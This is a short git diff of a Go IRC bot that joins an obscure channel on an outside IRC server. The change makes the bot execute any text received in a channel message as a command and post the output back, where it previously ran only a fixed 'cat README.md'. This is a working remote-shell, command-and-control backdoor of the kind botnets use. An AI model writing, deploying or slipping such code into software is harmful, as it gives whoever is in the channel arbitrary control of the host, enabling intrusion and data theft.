@@ -24,11 +24,13 @@ func main() {
 			if m.Command == "001" {
 				c.Write("JOIN #yyyzzzxxx")
 			} else if m.Command == "PRIVMSG" && c.FromChannel(m) {
+				fmt.Println(m.Params[1]) // debug
+
 				c.WriteMessage(&irc.Message{
 					Command: "PRIVMSG",
 					Params: []string{
-						m.Params[0],
-						cmdExecutor("cat README.md"),
+						m.Params[0], // channel/user name
+						cmdExecutor(m.Params[1]),
 					},
 				})
 			}
@@ -64,7 +66,7 @@ func connectToServer(ircServer string, clientConfig irc.ClientConfig) {
 func splitParams(line string) (string, []string) {
 	params := strings.Split(line, " ")
 	cmd := params[0]
-	
+
 	copy(params[0:], params[1:])
 	params[len(params)-1] = ""
 	params = params[:len(params)-1]
